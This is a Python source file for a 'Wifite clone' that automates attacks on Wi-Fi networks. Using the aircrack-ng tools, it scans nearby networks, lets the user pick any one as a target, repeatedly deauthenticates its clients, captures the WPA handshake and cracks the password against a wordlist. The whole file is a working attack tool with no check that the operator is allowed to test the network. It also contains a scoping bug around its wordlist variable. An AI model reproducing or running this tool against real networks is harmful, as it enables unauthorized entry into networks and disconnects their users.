import os
import subprocess
import time
import sys
import re
import signal
from datetime import datetime
from colorama import Fore, Style, init
from typing import List, Dict, Optional
from collections import namedtuple
import logging
import tempfile

# Initialize colorama
init(autoreset=True)

# Initialize logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

# Configuration
WORDLIST = os.getenv("WIFYTE_WORDLIST", "wifyte.txt")  # Path to the wordlist file
TIMEOUT = 180  # Timeout for capturing handshake (3 minutes)
SCAN_DURATION = 30  # Total scanning duration in seconds

Network = namedtuple("Network", ["BSSID", "Channel", "SSID", "Signal", "Encryption"])


def detect_wifi_adapter() -> str:
    logging.info("Detecting Wi-Fi adapter...")
    try:
        result = subprocess.run(
            ["iwconfig"], capture_output=True, text=True, timeout=10
        )
        adapters = [
            line.split()[0]
            for line in result.stdout.split("\n")
            if "IEEE 802.11" in line
        ]
        if not adapters:
            logging.error("No Wi-Fi adapter found that supports monitor mode.")
            sys.exit(1)
        logging.info(f"Supported Wi-Fi adapters: {', '.join(adapters)}")
        return adapters[0]  # Select the first adapter
    except subprocess.TimeoutExpired:
        logging.error("Command timed out.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Failed to detect Wi-Fi adapter: {e}")
        sys.exit(1)


def enable_monitor_mode(interface: str) -> str:
    logging.info(f"Enabling monitor mode on {interface}...")
    try:
        # Kill interfering processes
        subprocess.run(
            ["airmon-ng", "check", "kill"], check=True, stdout=subprocess.DEVNULL
        )

        # Stop interface if it's already in monitor mode
        subprocess.run(
            ["ip", "link", "set", interface, "down"],
            check=True,
            stdout=subprocess.DEVNULL,
        )

        # Start monitor mode
        subprocess.run(
            ["iw", "dev", interface, "set", "type", "monitor"],
            check=True,
            stdout=subprocess.DEVNULL,
        )

        # Bring interface back up
        subprocess.run(
            ["ip", "link", "set", interface, "up"],
            check=True,
            stdout=subprocess.DEVNULL,
        )

        # Verify monitor mode is enabled
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            logging.info(f"Successfully enabled monitor mode on {interface}")
            return interface
        else:
            # Fallback to airmon-ng if iw method failed
            logging.info("Falling back to airmon-ng method...")
            subprocess.run(
                ["airmon-ng", "start", interface], check=True, stdout=subprocess.DEVNULL
            )
            # Check if interface name changed (e.g., wlan0 to wlan0mon)
            result = subprocess.run(["iwconfig"], capture_output=True, text=True)
            for line in result.stdout.split("\n"):
                if "Mode:Monitor" in line:
                    mon_interface = line.split()[0]
                    logging.info(f"Monitor interface: {mon_interface}")
                    return mon_interface

            # If we still don't have a monitor interface, assume it's the same name
            return interface
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to enable monitor mode: {e}")
        sys.exit(1)


def scan_networks(interface: str) -> List[Network]:
    temp_file = tempfile.NamedTemporaryFile(suffix=".csv", delete=False)
    temp_file.close()
    csv_file = temp_file.name

    networks = []
    logging.info(
        f"Scanning for available Wi-Fi networks for {SCAN_DURATION} seconds..."
    )

    try:
        # Start airodump-ng process to collect data
        process = subprocess.Popen(
            [
                "airodump-ng",
                "--output-format",
                "csv",
                "--write",
                csv_file.replace(".csv", ""),
                interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for scan duration
        time.sleep(SCAN_DURATION)

        # Terminate airodump-ng
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()

        # Read and parse the CSV file
        csv_path = f"{csv_file.replace('.csv', '')}-01.csv"
        if not os.path.exists(csv_path):
            logging.error(f"CSV file not found: {csv_path}")
            return []

        with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # Split file into AP and client sections
        sections = content.split("\r\n\r\n")
        if len(sections) < 2:
            logging.warning("Invalid CSV format")
            return []

        ap_section = sections[0].strip()

        # Process AP section to extract networks
        ap_lines = ap_section.split("\r\n")
        if len(ap_lines) < 2:
            logging.warning("No APs found")
            return []

        # Skip header line
        ap_lines = ap_lines[1:]

        for line in ap_lines:
            if not line.strip():
                continue

            # CSV format: BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
            fields = [field.strip() for field in line.split(",")]
            if len(fields) < 14:
                continue

            bssid = fields[0].strip()
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue

            try:
                channel = fields[3].strip()
                if not channel or not channel.isdigit():
                    channel = "?"

                power = fields[8].strip()
                if power and power.lstrip("-").isdigit():
                    signal = int(power)
                else:
                    signal = -100

                encryption = fields[5].strip()
                if not encryption:
                    encryption = "Unknown"

                # ESSID is the last field that may contain commas within it
                ssid = fields[-1].strip()
                if not ssid or ssid == "<length: 0>":
                    ssid = "<Hidden>"

                networks.append(Network(bssid, channel, ssid, signal, encryption))
            except Exception as e:
                logging.debug(f"Error parsing network: {e}")
                continue

    except Exception as e:
        logging.error(f"Failed to scan networks: {e}")
    finally:
        # Clean up temporary files
        try:
            for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.cap"]:
                temp_path = csv_file.replace(".csv", "") + ext
                if os.path.exists(temp_path):
                    os.remove(temp_path)
        except Exception as e:
            logging.debug(f"Error cleaning up temporary files: {e}")

    # Sort networks by signal strength (best first)
    networks.sort(key=lambda x: x.Signal, reverse=True)

    if not networks:
        logging.warning("No networks detected. Please try again.")
        return []

    logging.info(f"Found {len(networks)} networks:")
    for i, network in enumerate(networks):
        signal_strength = abs(network.Signal)
        if signal_strength <= 50:
            color = Fore.GREEN  # Strong signal
        elif 50 < signal_strength <= 70:
            color = Fore.YELLOW  # Moderate signal
        else:
            color = Fore.RED  # Weak signal

        print(
            f"{i + 1}. {color}SSID: {network.SSID}, BSSID: {network.BSSID}, "
            f"Channel: {network.Channel}, Signal: {network.Signal} dBm, "
            f"Encryption: {network.Encryption}"
        )

    return networks


def deauth_attack(interface: str, bssid: str, channel: str):
    logging.info(f"Performing deauthentication attack on BSSID: {bssid}...")
    try:
        # Set channel first
        subprocess.run(
            ["iwconfig", interface, "channel", channel],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Send deauth packets
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        logging.info("Deauthentication attack completed")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to perform deauthentication attack: {e}")


def capture_handshake(
    interface: str, bssid: str, channel: str, ssid: str
) -> Optional[str]:
    logging.info(f"Attempting to capture handshake from {ssid} ({bssid})...")
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    cap_basename = f"handshake_{timestamp}"
    cap_file = f"{cap_basename}-01.cap"

    # Set channel first
    try:
        subprocess.run(
            ["iwconfig", interface, "channel", channel],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except subprocess.CalledProcessError:
        logging.warning(f"Failed to set channel {channel}, continuing anyway...")

    start_time = time.time()
    capture_process = None

    try:
        # Start airodump-ng to capture handshake
        capture_process = subprocess.Popen(
            [
                "airodump-ng",
                "--bssid",
                bssid,
                "--channel",
                channel,
                "--write",
                cap_basename,
                interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Loop until we either capture a handshake or timeout
        capture_attempts = 0
        max_attempts = 5

        while time.time() - start_time < TIMEOUT:
            # Run deauth attack after a brief delay
            time.sleep(5)

            if capture_attempts < max_attempts:
                logging.info(f"Deauth attempt {capture_attempts + 1}/{max_attempts}")
                deauth_attack(interface, bssid, channel)
                capture_attempts += 1

            # Check if we've captured a handshake
            if os.path.exists(cap_file):
                # Check if file has handshake using aircrack-ng
                check_process = subprocess.run(
                    ["aircrack-ng", cap_file], capture_output=True, text=True
                )

                if (
                    bssid.lower() in check_process.stdout.lower()
                    and "WPA" in check_process.stdout
                ):
                    logging.info(f"Handshake successfully captured for {ssid}!")
                    return cap_file

            time.sleep(10)

        logging.error(
            f"Failed to capture handshake for {ssid} after {TIMEOUT} seconds."
        )
        return None

    except Exception as e:
        logging.error(f"Error during handshake capture: {e}")
        return None
    finally:
        # Terminate airodump-ng process
        if capture_process:
            capture_process.terminate()
            try:
                capture_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                capture_process.kill()


def crack_handshake(cap_file: str, wordlist: str, target_bssid: str, ssid: str) -> bool:
    if not os.path.exists(wordlist):
        logging.error(f"Wordlist file not found: {wordlist}")
        return False

    logging.info(f"Starting cracking process using wordlist: {wordlist}...")
    try:
        # Get total password count
        wc_process = subprocess.run(
            ["wc", "-l", wordlist], capture_output=True, text=True
        )
        total_passwords = int(wc_process.stdout.split()[0])
        logging.info(f"Total passwords to test: {total_passwords}")

        # Run aircrack-ng to crack the handshake
        process = subprocess.Popen(
            ["aircrack-ng", "-w", wordlist, "-b", target_bssid, cap_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
        )

        # Show progress
        password_tested = 0
        found_password = None

        for line in iter(process.stdout.readline, ""):
            if "KEY FOUND!" in line:
                # Extract password
                match = re.search(r"KEY FOUND! \[ (.*?) \]", line)
                if match:
                    found_password = match.group(1)
                break

            # Update progress
            if "keys tested" in line.lower():
                match = re.search(r"(\d+)/(\d+)", line)
                if match:
                    password_tested = int(match.group(1))
                    if password_tested % 5000 == 0:
                        percent = (password_tested / total_passwords) * 100
                        logging.info(
                            f"Progress: {password_tested}/{total_passwords} ({percent:.2f}%)"
                        )

        # Wait for process to complete
        process.wait()

        if found_password:
            logging.info(
                f"Password for {ssid} ({target_bssid}) successfully cracked: {found_password}"
            )
            return True
        else:
            logging.warning(f"Password for {ssid} not found in wordlist.")
            return False

    except Exception as e:
        logging.error(f"Failed to crack handshake: {e}")
        return False


def disable_monitor_mode(interface: str):
    logging.info(f"Disabling monitor mode on {interface}...")
    try:
        # Try using iw first
        try:
            subprocess.run(
                ["ip", "link", "set", interface, "down"],
                check=True,
                stdout=subprocess.DEVNULL,
            )
            subprocess.run(
                ["iw", "dev", interface, "set", "type", "managed"],
                check=True,
                stdout=subprocess.DEVNULL,
            )
            subprocess.run(
                ["ip", "link", "set", interface, "up"],
                check=True,
                stdout=subprocess.DEVNULL,
            )
        except subprocess.CalledProcessError:
            # Fallback to airmon-ng
            subprocess.run(
                ["airmon-ng", "stop", interface], check=True, stdout=subprocess.DEVNULL
            )

        # Restart network services
        subprocess.run(
            ["systemctl", "restart", "NetworkManager"],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        logging.info("Monitor mode disabled successfully")
    except Exception as e:
        logging.error(f"Failed to disable monitor mode: {e}")


def main():
    print(
        f"{Fore.CYAN}{Style.BRIGHT}===== Wifite Clone - Handshake Capture Tool ====={Style.RESET_ALL}"
    )

    # Check if running as root
    if os.geteuid() != 0:
        logging.error("This program must be run as root. Try using sudo.")
        sys.exit(1)

    # Check if required tools are installed
    required_tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing_tools = []

    for tool in required_tools:
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            missing_tools.append(tool)

    if missing_tools:
        logging.error(f"Missing required tools: {', '.join(missing_tools)}")
        logging.error("Please install aircrack-ng suite: sudo apt install aircrack-ng")
        sys.exit(1)

    # Set up signal handler for clean exit
    def signal_handler(sig, frame):
        logging.info("Interrupted. Cleaning up...")
        if "monitor_interface" in locals():
            disable_monitor_mode(monitor_interface)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    adapter = detect_wifi_adapter()
    monitor_interface = enable_monitor_mode(adapter)

    try:
        while True:
            networks = scan_networks(monitor_interface)

            if not networks:
                retry = input("No networks found. Retry scan? (y/n): ").lower()
                if retry != "y":
                    break
                continue

            try:
                choice = (
                    int(
                        input(
                            f"{Fore.YELLOW}Enter the number of the network you want to test (1-{len(networks)}): {Style.RESET_ALL}"
                        )
                    )
                    - 1
                )
                if choice < 0 or choice >= len(networks):
                    logging.error("Invalid selection.")
                    continue
            except ValueError:
                logging.error("Please enter a valid number.")
                continue

            target = networks[choice]
            TARGET_BSSID = target.BSSID
            TARGET_SSID = target.SSID

            logging.info(
                f"Target selected: SSID: {TARGET_SSID}, BSSID: {TARGET_BSSID}, "
                f"Channel: {target.Channel}, Encryption: {target.Encryption}"
            )

            if "WPA" not in target.Encryption and "WEP" not in target.Encryption:
                logging.warning(
                    f"Network {TARGET_SSID} appears to use {target.Encryption} encryption, which may not be compatible with handshake capture."
                )
                continue_anyway = input("Continue anyway? (y/n): ").lower()
                if continue_anyway != "y":
                    continue

            cap_file = capture_handshake(
                monitor_interface, TARGET_BSSID, target.Channel, TARGET_SSID
            )
            if not cap_file:
                logging.error("Test failed. No handshake captured.")
                retry = input("Try another network? (y/n): ").lower()
                if retry != "y":
                    break
                continue

            # Confirm wordlist exists or get a new one
            while not os.path.exists(WORDLIST):
                WORDLIST = input(
                    f"Wordlist {WORDLIST} not found. Enter path to wordlist: "
                )
                if not WORDLIST:
                    logging.error("Wordlist is required for cracking.")
                    break

            if not os.path.exists(WORDLIST):
                logging.error("No valid wordlist provided. Skipping cracking phase.")
                retry = input("Try another network? (y/n): ").lower()
                if retry != "y":
                    break
                continue

            success = crack_handshake(cap_file, WORDLIST, TARGET_BSSID, TARGET_SSID)
            if not success:
                logging.warning("Cracking failed. Password not found in wordlist.")

            retry = input("Try another network? (y/n): ").lower()
            if retry != "y":
                break

    finally:
        choice = input("Do you want to disable monitor mode? (y/n): ").lower()
        if choice == "y":
            disable_monitor_mode(monitor_interface)
        logging.info("Program finished.")


if __name__ == "__main__":
    main()
